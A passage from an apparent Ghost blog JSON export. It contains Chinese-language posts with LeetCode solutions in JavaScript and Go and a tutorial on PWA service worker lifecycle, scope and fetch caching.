a=[1];\n    let b=[1];\n    for(var i=1;i&lt;n;i++){\n        a[i]=a[i-1]+b[i-1];\n        b[i]=a[i-1];\n    }\n    var res=a[n-1]+b[n-1];\n    for(var i=n-2;i&gt;=0;i--){\n        if(numStr[i]==='1'&amp;&amp;numStr[i+1]==='1') break;\n        if(numStr[i]==='0'&amp;&amp;numStr[i+1]==='0') res-=b[i];\n    }\n    return res;\n};\n</code></pre>\n<ul>\n<li><code>if(numStr[i]==='1'&amp;&amp;numStr[i+1]==='1') break;</code>因为11xxxx内等于111111内，没有连续1的个数是一样的。</li>\n<li>'00'减去fn(i)的个数。100xxx不能大于101111，去到1111内没有连续1的个数即可。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"136","plaintext":"这道题给了我们一个数字，让我们求不大于这个数字的所有数字中，其二进制的表示形式中没有连续1的个数。\n这里可以先做个简单的题目，长度为n的二进制的表示形式中没有连续1的个数。\n\n输入：N = 1\n输出：2\n// 3个字符串是0,1  （1+1）\n\n输入：N = 2\n输出：3\n// 3个字符串是00,01,10 （2+1）\n\n输入：N = 3\n输出：5\n// 5个字符串是000,001,010,100,101 （3+2）\n\n输入：N = 4\n输出：8\n// 5个字符串是0000,0001,0010,0100,0101,1000,1001,1010 （5+3）\n\n\n这个问题可以用动态规划来解决。假设a [i]是长度为i的二进制串的数目，它不包含任何两个连续的1并且以0结尾。同样，让b\n[i]是以1结尾的这样的串的数目。我们可以追加0或1到以0结尾的字符串，但是我们只能将0附加到以1结尾的字符串。这产生递归关系：\n\n如当k=5时，二进制数的范围是00000-11111，我们可以将其分为两个部分，00000-01111和10000-10111，因为任何大于11000的数字都是不成立的，因为有开头已经有了两个连续1。而我们发现其实00000-01111就是f(4)，而10000-10111就是f(3)，所以f(5)\n= f(4) + f(3)，这就是一个斐波那契数列啦.\n\nvar findIntegers = function(num) {\n    let numStr=Array.from(num.toString(2)).reverse().join('');\n    let n=numStr.length;\n    let a=[1];\n    let b=[1];\n    for(var i=1;i<n;i++){\n        a[i]=a[i-1]+b[i-1];\n        b[i]=a[i-1];\n    }\n    var res=a[n-1]+b[n-1];\n    for(var i=n-2;i>=0;i--){\n        if(numStr[i]==='1'&&numStr[i+1]==='1') break;\n        if(numStr[i]==='0'&&numStr[i+1]==='0') res-=b[i];\n    }\n    return res;\n};\n\n\n * if(numStr[i]==='1'&&numStr[i+1]==='1') break;因为11xxxx内等于111111内，没有连续1的个数是一样的。\n * '00'减去fn(i)的个数。100xxx不能大于101111，去到1111内没有连续1的个数即可。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-01-02T08:49:36.000Z","created_by":"1","updated_at":"2018-01-02T09:18:57.000Z","updated_by":"1","published_at":"2018-01-02T09:10:31.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d345","uuid":"4f5332fa-c68c-4d68-9ffa-f4a6015865a0","title":"leetcode --- String to Integer (atoi)","slug":"leetcode-string-to-integer-atoi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"1.需要考虑数字、符号和空格的情况。因为数字前面是可以有空格的。\\n2.非上面的直接返回0.\\n3.考虑边界问题32位有符号。 `2147483647  ～  -2147483648`\\n\\n```\\nvar myAtoi = function(str) {\\n    var n = str.length;\\n    var sign = 1;\\n    var num = 0;\\n    var isBegin = false;\\n    var end = 0;\\n    for(var i=0;i<n;i++){\\n        var c = str[i];\\n        if(c===' '){\\n            if(isBegin){\\n                break;\\n            }\\n        } else if(c>='0'&&c<='9'){\\n            var end = c - '0';\\n            num = num  * 10 + end;\\n\\n            isBegin = true;\\n        } else {\\n        \\n            if((c==='+'||c==='-')&&!isBegin){\\n                sign = c === '-' ? -1 : 1;\\n                isBegin = true;\\n                \\n            } else {\\n                break;\\n            }\\n        }\\n    }\\n    var result = sign * num\\n    if(result>2147483647){\\n        result=2147483647;\\n    }\\n    if(result<-2147483648){\\n        result=-2147483648;\\n    }\\n    return result;\\n};\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>1.需要考虑数字、符号和空格的情况。因为数字前面是可以有空格的。<br>\n2.非上面的直接返回0.<br>\n3.考虑边界问题32位有符号。 <code>2147483647  ～  -2147483648</code></p>\n<pre><code>var myAtoi = function(str) {\n    var n = str.length;\n    var sign = 1;\n    var num = 0;\n    var isBegin = false;\n    var end = 0;\n    for(var i=0;i&lt;n;i++){\n        var c = str[i];\n        if(c===' '){\n            if(isBegin){\n                break;\n            }\n        } else if(c&gt;='0'&amp;&amp;c&lt;='9'){\n            var end = c - '0';\n            num = num  * 10 + end;\n\n            isBegin = true;\n        } else {\n        \n            if((c==='+'||c==='-')&amp;&amp;!isBegin){\n                sign = c === '-' ? -1 : 1;\n                isBegin = true;\n                \n            } else {\n                break;\n            }\n        }\n    }\n    var result = sign * num\n    if(result&gt;2147483647){\n        result=2147483647;\n    }\n    if(result&lt;-2147483648){\n        result=-2147483648;\n    }\n    return result;\n};\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"137","plaintext":"1.需要考虑数字、符号和空格的情况。因为数字前面是可以有空格的。\n2.非上面的直接返回0.\n3.考虑边界问题32位有符号。 2147483647 ～ -2147483648\n\nvar myAtoi = function(str) {\n    var n = str.length;\n    var sign = 1;\n    var num = 0;\n    var isBegin = false;\n    var end = 0;\n    for(var i=0;i<n;i++){\n        var c = str[i];\n        if(c===' '){\n            if(isBegin){\n                break;\n            }\n        } else if(c>='0'&&c<='9'){\n            var end = c - '0';\n            num = num  * 10 + end;\n\n            isBegin = true;\n        } else {\n        \n            if((c==='+'||c==='-')&&!isBegin){\n                sign = c === '-' ? -1 : 1;\n                isBegin = true;\n                \n            } else {\n                break;\n            }\n        }\n    }\n    var result = sign * num\n    if(result>2147483647){\n        result=2147483647;\n    }\n    if(result<-2147483648){\n        result=-2147483648;\n    }\n    return result;\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-01-08T08:28:11.000Z","created_by":"1","updated_at":"2018-01-08T08:43:30.000Z","updated_by":"1","published_at":"2018-01-08T08:43:19.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d346","uuid":"8aa60969-0c94-4e27-b290-717376a79d66","title":"leetcode--3Sum","slug":"leetcode-3sum","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nfunc threeSum(nums []int) [][]int {\\n\\tsort.Ints(nums)\\n\\tresult := [][]int{}\\n\\tfor i := 0; i < len(nums); i++ {\\n\\t\\tif i > 0 && nums[i] == nums[i-1] {\\n\\t\\t\\tcontinue\\n\\t\\t}\\n        if nums[i] > 0 {\\n\\t\\t\\tbreak\\n\\t\\t}\\n\\t\\tfor j := i + 1; j < len(nums); j++ {\\n\\t\\t\\tif j > i+1 && nums[j] == nums[j-1] {\\n\\t\\t\\t\\tcontinue\\n\\t\\t\\t}\\n            if nums[i]+nums[j] > 0 {\\n\\t\\t\\t\\tbreak\\n\\t\\t\\t}\\n\\t\\t\\tfor z := j + 1; z < len(nums); z++ {\\n\\n\\t\\t\\t\\tif nums[i]+nums[j] > nums[z] {\\n\\t\\t\\t\\t\\tbreak\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tif nums[i]+nums[j] == -nums[z] {\\n\\t\\t\\t\\t\\ttemp := []int{nums[i], nums[j], nums[z]}\\n\\t\\t\\t\\t\\tresult = append(result, temp)\\n\\t\\t\\t\\t\\tbreak\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\treturn result\\n}\\n```\\n上面的答案超时了.还是要转成twoSum来解决问题.\\n```\\nfunc twoSum(nums []int,target int) [][]int {\\n   // fmt.Println(nums,target)\\n    result := [][]int{}\\n    l:=0\\n    r:=len(nums)-1\\n\\tfor   {\\n\\t\\tif(r<=l){\\n\\t\\t\\tbreak\\n\\t\\t}\\n        if nums[l]+nums[r]<target {\\n            l++;\\n            continue;\\n        }\\n        if nums[l]+nums[r]>target {\\n            r--;\\n            continue;\\n        }\\n        if nums[l]+nums[r]==target {\\n            if l!=0&&r!=len(nums)-1&&nums[l]==nums[l-1]&&nums[r]==nums[r+1] {\\n                l++;\\n                r--;\\n                continue\\n            }\\n            // fmt.Println(nums[l],nums[r],l,r)\\n            temp:=[]int{nums[l],nums[r]}\\n            result=append(result,temp)\\n            l++;\\n            r--;\\n            continue;\\n        }\\n    }\\n\\treturn result\\n}\\nfunc threeSum(nums []int) [][]int {\\n\\tsort.Ints(nums)\\n\\tresult := [][]int{}\\n\\tfor i := 0; i < len(nums); i++ {\\n\\t\\tif i > 0 && nums[i] == nums[i-1] {\\n\\t\\t\\tcontinue\\n\\t\\t}\\n        if nums[i] > 0 {\\n\\t\\t\\tbreak\\n\\t\\t}\\n\\t\\tres:=twoSum(nums[i+1:],0-nums[i])\\n         // fmt.Println(res)\\n\\t\\tfor _,v:=range res{\\n\\t\\t\\tresult=append(result,append(v, nums[i]))\\n\\t\\t}\\n\\t}\\n\\treturn result\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>func threeSum(nums []int) [][]int {\n\tsort.Ints(nums)\n\tresult := [][]int{}\n\tfor i := 0; i &lt; len(nums); i++ {\n\t\tif i &gt; 0 &amp;&amp; nums[i] == nums[i-1] {\n\t\t\tcontinue\n\t\t}\n        if nums[i] &gt; 0 {\n\t\t\tbreak\n\t\t}\n\t\tfor j := i + 1; j &lt; len(nums); j++ {\n\t\t\tif j &gt; i+1 &amp;&amp; nums[j] == nums[j-1] {\n\t\t\t\tcontinue\n\t\t\t}\n            if nums[i]+nums[j] &gt; 0 {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tfor z := j + 1; z &lt; len(nums); z++ {\n\n\t\t\t\tif nums[i]+nums[j] &gt; nums[z] {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tif nums[i]+nums[j] == -nums[z] {\n\t\t\t\t\ttemp := []int{nums[i], nums[j], nums[z]}\n\t\t\t\t\tresult = append(result, temp)\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn result\n}\n</code></pre>\n<p>上面的答案超时了.还是要转成twoSum来解决问题.</p>\n<pre><code>func twoSum(nums []int,target int) [][]int {\n   // fmt.Println(nums,target)\n    result := [][]int{}\n    l:=0\n    r:=len(nums)-1\n\tfor   {\n\t\tif(r&lt;=l){\n\t\t\tbreak\n\t\t}\n        if nums[l]+nums[r]&lt;target {\n            l++;\n            continue;\n        }\n        if nums[l]+nums[r]&gt;target {\n            r--;\n            continue;\n        }\n        if nums[l]+nums[r]==target {\n            if l!=0&amp;&amp;r!=len(nums)-1&amp;&amp;nums[l]==nums[l-1]&amp;&amp;nums[r]==nums[r+1] {\n                l++;\n                r--;\n                continue\n            }\n            // fmt.Println(nums[l],nums[r],l,r)\n            temp:=[]int{nums[l],nums[r]}\n            result=append(result,temp)\n            l++;\n            r--;\n            continue;\n        }\n    }\n\treturn result\n}\nfunc threeSum(nums []int) [][]int {\n\tsort.Ints(nums)\n\tresult := [][]int{}\n\tfor i := 0; i &lt; len(nums); i++ {\n\t\tif i &gt; 0 &amp;&amp; nums[i] == nums[i-1] {\n\t\t\tcontinue\n\t\t}\n        if nums[i] &gt; 0 {\n\t\t\tbreak\n\t\t}\n\t\tres:=twoSum(nums[i+1:],0-nums[i])\n         // fmt.Println(res)\n\t\tfor _,v:=range res{\n\t\t\tresult=append(result,append(v, nums[i]))\n\t\t}\n\t}\n\treturn result\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"138","plaintext":"func threeSum(nums []int) [][]int {\n\tsort.Ints(nums)\n\tresult := [][]int{}\n\tfor i := 0; i < len(nums); i++ {\n\t\tif i > 0 && nums[i] == nums[i-1] {\n\t\t\tcontinue\n\t\t}\n        if nums[i] > 0 {\n\t\t\tbreak\n\t\t}\n\t\tfor j := i + 1; j < len(nums); j++ {\n\t\t\tif j > i+1 && nums[j] == nums[j-1] {\n\t\t\t\tcontinue\n\t\t\t}\n            if nums[i]+nums[j] > 0 {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tfor z := j + 1; z < len(nums); z++ {\n\n\t\t\t\tif nums[i]+nums[j] > nums[z] {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tif nums[i]+nums[j] == -nums[z] {\n\t\t\t\t\ttemp := []int{nums[i], nums[j], nums[z]}\n\t\t\t\t\tresult = append(result, temp)\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn result\n}\n\n\n上面的答案超时了.还是要转成twoSum来解决问题.\n\nfunc twoSum(nums []int,target int) [][]int {\n   // fmt.Println(nums,target)\n    result := [][]int{}\n    l:=0\n    r:=len(nums)-1\n\tfor   {\n\t\tif(r<=l){\n\t\t\tbreak\n\t\t}\n        if nums[l]+nums[r]<target {\n            l++;\n            continue;\n        }\n        if nums[l]+nums[r]>target {\n            r--;\n            continue;\n        }\n        if nums[l]+nums[r]==target {\n            if l!=0&&r!=len(nums)-1&&nums[l]==nums[l-1]&&nums[r]==nums[r+1] {\n                l++;\n                r--;\n                continue\n            }\n            // fmt.Println(nums[l],nums[r],l,r)\n            temp:=[]int{nums[l],nums[r]}\n            result=append(result,temp)\n            l++;\n            r--;\n            continue;\n        }\n    }\n\treturn result\n}\nfunc threeSum(nums []int) [][]int {\n\tsort.Ints(nums)\n\tresult := [][]int{}\n\tfor i := 0; i < len(nums); i++ {\n\t\tif i > 0 && nums[i] == nums[i-1] {\n\t\t\tcontinue\n\t\t}\n        if nums[i] > 0 {\n\t\t\tbreak\n\t\t}\n\t\tres:=twoSum(nums[i+1:],0-nums[i])\n         // fmt.Println(res)\n\t\tfor _,v:=range res{\n\t\t\tresult=append(result,append(v, nums[i]))\n\t\t}\n\t}\n\treturn result\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-01-17T12:07:22.000Z","created_by":"1","updated_at":"2018-01-20T07:46:42.000Z","updated_by":"1","published_at":"2018-01-18T05:50:26.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d347","uuid":"7d05e3ae-6c59-4de3-a39a-f6b88c3db64a","title":"leetcode --- 3Sum Closest","slug":"leetcode-3sum-closest","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"给定一个n个整数的数组s，找出s中的三个整数，使得总和最接近给定的数字.返回三个整数的总和。还是类似3Sum的解法。\\n```\\nfunc threeSumClosest(nums []int, target int) int {\\n    sort.Ints(nums)\\n    temp :=math.MaxInt32  \\n    result :=0\\n\\tfor i := 0; i < len(nums); i++ {\\n\\t\\tif i > 0 && nums[i] == nums[i-1] {\\n\\t\\t\\tcontinue\\n\\t\\t}\\n        if i >= len(nums)-2 {\\n            break\\n        }\\n\\t\\tres:=twoSum(nums[i+1:],target-nums[i])\\n        if res+nums[i]==target {\\n             return target\\n        }\\n        absRes:=abs(target-nums[i]-res)\\n        if temp>absRes{\\n            temp=absRes\\n            result=res+nums[i]\\n        }\\n\\t}\\n    return result\\n}\\n\\nfunc abs(x int) int {\\n    if x < 0 {\\n        return -x\\n    }\\n    return x\\n}\\n\\nfunc twoSum(nums []int,target int) int {\\n    // fmt.Println(nums,target)\\n    l:=0\\n    r:=len(nums)-1\\n    temp:=math.MaxInt32 \\n    result:=0\\n\\tfor   {\\n\\t\\tif(r<=l){\\n\\t\\t\\tbreak\\n\\t\\t}\\n        absRes:=abs(target-nums[l]-nums[r])\\n        if temp>absRes{\\n            temp=absRes\\n            result=nums[l]+nums[r]\\n        }\\n        if nums[l]+nums[r]<target {\\n            l++;\\n            continue;\\n        }\\n        if nums[l]+nums[r]>target {\\n            r--;\\n            continue;\\n        }\\n        if nums[l]+nums[r]==target {\\n            return nums[l]+nums[r]\\n        }\\n    }\\n    return result\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>给定一个n个整数的数组s，找出s中的三个整数，使得总和最接近给定的数字.返回三个整数的总和。还是类似3Sum的解法。</p>\n<pre><code>func threeSumClosest(nums []int, target int) int {\n    sort.Ints(nums)\n    temp :=math.MaxInt32  \n    result :=0\n\tfor i := 0; i &lt; len(nums); i++ {\n\t\tif i &gt; 0 &amp;&amp; nums[i] == nums[i-1] {\n\t\t\tcontinue\n\t\t}\n        if i &gt;= len(nums)-2 {\n            break\n        }\n\t\tres:=twoSum(nums[i+1:],target-nums[i])\n        if res+nums[i]==target {\n             return target\n        }\n        absRes:=abs(target-nums[i]-res)\n        if temp&gt;absRes{\n            temp=absRes\n            result=res+nums[i]\n        }\n\t}\n    return result\n}\n\nfunc abs(x int) int {\n    if x &lt; 0 {\n        return -x\n    }\n    return x\n}\n\nfunc twoSum(nums []int,target int) int {\n    // fmt.Println(nums,target)\n    l:=0\n    r:=len(nums)-1\n    temp:=math.MaxInt32 \n    result:=0\n\tfor   {\n\t\tif(r&lt;=l){\n\t\t\tbreak\n\t\t}\n        absRes:=abs(target-nums[l]-nums[r])\n        if temp&gt;absRes{\n            temp=absRes\n            result=nums[l]+nums[r]\n        }\n        if nums[l]+nums[r]&lt;target {\n            l++;\n            continue;\n        }\n        if nums[l]+nums[r]&gt;target {\n            r--;\n            continue;\n        }\n        if nums[l]+nums[r]==target {\n            return nums[l]+nums[r]\n        }\n    }\n    return result\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"139","plaintext":"给定一个n个整数的数组s，找出s中的三个整数，使得总和最接近给定的数字.返回三个整数的总和。还是类似3Sum的解法。\n\nfunc threeSumClosest(nums []int, target int) int {\n    sort.Ints(nums)\n    temp :=math.MaxInt32  \n    result :=0\n\tfor i := 0; i < len(nums); i++ {\n\t\tif i > 0 && nums[i] == nums[i-1] {\n\t\t\tcontinue\n\t\t}\n        if i >= len(nums)-2 {\n            break\n        }\n\t\tres:=twoSum(nums[i+1:],target-nums[i])\n        if res+nums[i]==target {\n             return target\n        }\n        absRes:=abs(target-nums[i]-res)\n        if temp>absRes{\n            temp=absRes\n            result=res+nums[i]\n        }\n\t}\n    return result\n}\n\nfunc abs(x int) int {\n    if x < 0 {\n        return -x\n    }\n    return x\n}\n\nfunc twoSum(nums []int,target int) int {\n    // fmt.Println(nums,target)\n    l:=0\n    r:=len(nums)-1\n    temp:=math.MaxInt32 \n    result:=0\n\tfor   {\n\t\tif(r<=l){\n\t\t\tbreak\n\t\t}\n        absRes:=abs(target-nums[l]-nums[r])\n        if temp>absRes{\n            temp=absRes\n            result=nums[l]+nums[r]\n        }\n        if nums[l]+nums[r]<target {\n            l++;\n            continue;\n        }\n        if nums[l]+nums[r]>target {\n            r--;\n            continue;\n        }\n        if nums[l]+nums[r]==target {\n            return nums[l]+nums[r]\n        }\n    }\n    return result\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-01-21T07:23:34.000Z","created_by":"1","updated_at":"2018-01-21T07:24:54.000Z","updated_by":"1","published_at":"2018-01-21T07:24:52.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d348","uuid":"7c4d5a41-be07-4a7c-93fd-3c47b28dccc7","title":"PWA","slug":"pwa","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##  Service Worker\\n\\n#### 生命周期\\n先来看一下一个service worker的运行周期\\n\\n    1. 安装install\\n    2. 激活activate\\n    3. 监听fetch和message事件\\n\\n\\n默认范围:\\n```\\n    navigator.serviceWorker.register('/assets/sw.js').then(function (registration){\\n        console.log('service worker 注册成功', registration.scope);\\n    }).catch(function (err) {\\n        console.log('servcie worker 注册失败')\\n    });\\n    // 默认scope是/assets\\n```\\n修改默认范围:\\n\\n`navigator.serviceWorker.register(\\\"/assets/sw.js\\\", { scope: \\\"/\\\" })`要设置`scope='/'`response返回sw.js要带上`Service-Worker-Allowed='/'`的头。这样才能注册成功\\n\\n```\\nnavigator.serviceWorker.register(\\\"/assets/sw.js\\\", { scope: \\\"/\\\" }).catch(() => {\\n  console.log('servcie worker 注册失败')\\n});\\n```\\n\\n不在范围内的请求，fetch拦截不到:\\n\\n如scope='/assets'，请求`/index.js`,fetch是拦截不到的。因此，这些请求不能通过fetch拦截来缓存。可以用cache.addAll()添加缓存。\\n\\n\\n#### fetch事件\\n在页面发起http请求时，service worker可以通过fetch事件拦截请求，并且给出自己的响应。\\n\\n提供了Request、Response对象，如果做过后端开发，对Request、Response应该比较熟悉。前端要发起请求可以通过url发起，也可以使用Request对象发起，而且Request可以复用。但是Response用在哪里呢？在service worker出现之前，前端确实不会自己给自己发消息，但是有了service worker，就可以在拦截请求之后根据需要发回自己的响应，对页面而言，这个普通的请求结果并没有区别，这是Response的一处应用。而且权限很大，可以拦截chrome插件的网络请求（可以以此推断你装了什么插件)。对于我们开发，缓存插件的请求是没什么意义的，一般都过滤掉。\\n```\\nvar hostReg = /(localhost|o8ci6tgz8.qnssl.com)/;\\n\\nself.addEventListener('fetch', function (evt) {\\n  console.log(evt.request.url);\\n  evt.respondWith(\\n    caches.match(evt.request).then(function (response) {\\n      if (response) {\\n        return response;\\n      }\\n      var request = evt.request.clone();\\n      return fetch(request).then(function (response) {\\n        if (response && response.status === 200 && response.url.match(hostReg)) {\\n          var responseClone = response.clone();\\n          caches.open(VERSION).then(function (cache) {\\n            // console.log(evt.request.url);\\n            cache.put(evt.request, responseClone);\\n          });\\n        }\\n        return response;\\n      });\\n    })\\n  )\\n});\\n\\n```\\n\\n\\n\\n#### message事件\\n\\n页面和serviceWorker之间可以通过posetMessage()方法发送消息，发送的消息可以通过message事件接收到。\\n这是一个双向的过程，页面可以发消息给service worker，service worker也可以发送消息给页面，由于这个特性，可以将service worker作为中间纽带，使得一个域名或者子域名下的多个页面可以自由通信。\\n\\n\\n#### 离线缓存和CDN\\n\\n现在，我们的网站一般都是单页应用。一般html放在服务器，其他资源文件放CDN。和平时不同，不要使用默认scope，而是设置CDN为scope。一般其他资源文件太多，全部列出来困难且不易维护，使用fetch拦截，来缓存。然后，只需指定缓存['/']。\\n\\n\\n#### 安全\\n\\nserviceWorker权限是太大的，因此我们要保证页面没有XSS漏洞。一旦注册了别人的serviceWorker，后果可想而知。不过，现在的框架都能帮我们处理XSS问题。\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h2 id=\"serviceworker\">Service Worker</h2>\n<h4 id=\"\">生命周期</h4>\n<p>先来看一下一个service worker的运行周期</p>\n<pre><code>1. 安装install\n2. 激活activate\n3. 监听fetch和message事件\n</code></pre>\n<p>默认范围:</p>\n<pre><code>    navigator.serviceWorker.register('/assets/sw.js').then(function (registration){\n        console.log('service worker 注册成功', registration.scope);\n    }).catch(function (err) {\n        console.log('servcie worker 注册失败')\n    });\n    // 默认scope是/assets\n</code></pre>\n<p>修改默认范围:</p>\n<p><code>navigator.serviceWorker.register(&quot;/assets/sw.js&quot;, { scope: &quot;/&quot; })</code>要设置<code>scope='/'</code>response返回sw.js要带上<code>Service-Worker-Allowed='/'</code>的头。这样才能注册成功</p>\n<pre><code>navigator.serviceWorker.register(&quot;/assets/sw.js&quot;, { scope: &quot;/&quot; }).catch(() =&gt; {\n  console.log('servcie worker 注册失败')\n});\n</code></pre>\n<p>不在范围内的请求，fetch拦截不到:</p>\n<p>如scope='/assets'，请求<code>/index.js</code>,fetch是拦截不到的。因此，这些请求不能通过fetch拦截来缓存。可以用cache.addAll()添加缓存。</p>\n<h4 id=\"fetch\">fetch事件</h4>\n<p>在页面发起http请求时，service worker可以通过fetch事件拦截请求，并且给出自己的响应。</p>\n<p>提供了Request、Response对象，如果做过后端开发，对Request、Response应该比较熟悉。前端要发起请求可以通过url发起，也可以使用Request对象发起，而且Request可以复用。但是Response用在哪里呢？在service worker出现之前，前端确实不会自己给自己发消息，但是有了service worker，就可以在拦截请求之后根据需要发回自己的响应，对页面而言，这个普通的请求结果并没有区别，这是Response的一处应用。而且权限很大，可以拦截chrome插件的网络请求（可以以此推断你装了什么插件)。对于我们开发，缓存插件的请求是没什么意义的，一般都过滤掉。</p>\n<pre><code>var hostReg = /(localhost|o8ci6tgz8.qnssl.com)/;\n\nself.addEventListener('fetch', function (evt) {\n  console.log(evt.request.url);\n  evt.respondWith(\n    caches.match(evt.request).then(function (response) {\n      if (response) {\n        return response;\n      }\n      var request = evt.request.clone();\n      return fetch(request).then(function (response) {\n        if (response &amp;&amp; response.status === 200 &amp;&amp; response.url.match(hostReg)) {\n          var responseClone = response.clone();\n          caches.open(VERSION).then(function (cache) {\n            // console.log(evt.request.url);\n            cache.put(evt.request, responseClone);\n          });\n        }\n        return response;\n      });\n    })\n  )\n});\n\n</code></pre>\n<h4 id=\"message\">message事件</h4>\n<p>页面和serviceWorker之间可以通过posetMessage()方法发送消息，发送的消息可以通过message事件接收到。<br>\n这是一个双向的过程，页面可以发消息给service worker，service worker也可以发送消息给页面，由于这个特性，可以将service worker作为中间纽带，使得一个域名或者子域名下的多个页面可以自由通信。</p>\n<h4 id=\"cdn\">离线缓存和CDN</h4>\n<p>现在，我们的网站一般都是单页应用。一般html放在服务器，其他资源文件放CDN。和平时不同，不要使用默认scope，而是设置CDN为scope。一般其他资源文件太多，全部列出来困难且不易维护，使用fetch拦截，来缓存。然后，只需指定缓存['/']。</p>\n<h4 id=\"\">安全</h4>\n<p>serviceWorker权限是太大的，因此我们要保证页面没有XSS漏洞。一旦注册了别人的serviceWorker，后果可想而知。不过，现在的框架都能帮我们处理XSS问题。</p>\n<!--kg-card-end: markdown-->","comment_id":"140","plaintext":"Service Worker\n生命周期\n先来看一下一个service worker的运行周期\n\n1. 安装install\n2. 激活activate\n3. 监听fetch和message事件\n\n\n默认范围:\n\n    navigator.serviceWorker.register('/assets/sw.js').then(function (registration){\n        console.log('service worker 注册成功', registration.scope);\n    }).catch(function (err) {\n        console.log('servcie worker 注册失败')\n    });\n    // 默认scope是/assets\n\n\n修改默认范围:\n\nnavigator.serviceWorker.register(\"/assets/sw.js\", { scope: \"/\" })要设置scope='/'\nresponse返回sw.js要带上Service-Worker-Allowed='/'的头。这样才能注册成功\n\nnavigator.serviceWorker.register(\"/assets/sw.js\", { scope: \"/\" }).catch(() => {\n  console.log('servcie worker 注册失败')\n});\n\n\n不在范围内的请求，fetch拦截不到:\n\n如scope='/assets'，请求/index.js\n,fetch是拦截不到的。因此，这些请求不能通过fetch拦截来缓存。可以用cache.addAll()添加缓存。\n\nfetch事件\n在页面发起http请求时，service worker可以通过fetch事件拦截请求，并且给出自己的响应。\n\n提供了Request、Response对象，如果做过后端开发，对Request、Response应该比较熟悉。前端要发起请求可以通过url发起，也可以使用Request对象发起，而且Request可以复用。但是Response用在哪里呢？在service\nworker出现之前，前端确实不会自己给自己发消息，但是有了service\nworker，就可以在拦截请求之后根据需要发回自己的响应，对页面而言，这个普通的请求结果并没有区别，这是Response的一处应用。而且权限很大，可以拦截chrome插件的网络请求（可以以此推断你装了什么插件)。对于我们开发，缓存插件的请求是没什么意义的，一般都过滤掉。\n\nvar hostReg = /(localhost|o8ci6tgz8.qnssl.com)/;\n\nself.addEventListener('fetch', function (evt) {\n  console.log(evt.request.url);\n  evt.respondWith(\n    caches.match(evt.request).then(function (response) {\n      if (response) {\n        return response;\n      }\n      var request = evt.request.clone();\n      return fetch(request).then(function (response) {\n        if (response && response.status === 200 && response.url.match(hostReg)) {\n          var responseClone = response.clone();\n          caches.open(VERSION).then(function (cache) {\n            // console.log(evt.request.url);\n            cache.put(evt.request, responseClone);\n          });\n        }\n        return response;\n      });\n    })\n  )\n});\n\n\n\nmessage事件\n页面和serviceWorker之间可以通过posetMessage()方法发送消息，发送的消息可以通过message事件接收到。\n这是一个双向的过程，页面可以发消息给service worker，service worker也可以发送消息给页面，由于这个特性，可以将service\nworker作为中间纽带，使得一个域名或者子域名下的多个页面可以自由通信。\n\n离线缓存和CDN\n现在，我们的网站一般都是单页应用。一般html放在服务器，其他资源文件放CDN。和平时不同，不要使用默认scope，而是设置CDN为scope。一般其他资源文件太多，全部列出来困难且不易维护，使用fetch拦截，来缓存。然后，只需指定缓存['/']。\n\n安全\nserviceWorker权限是太大的，因此我们要保证页面没有XSS漏洞。一旦注册了别人的serviceWorker，后果可想而知。不过，现在的框架都能帮我们处理XSS问题。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-01-24T07:52:16.000Z","created_by":"1","updated_at":"2018-02-09T07:21:01.000Z","updated_by":"1","published_at":"2018-01-10T07:52:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d349","uuid":"d449427a-1b11-4b92-b427-affffb873a0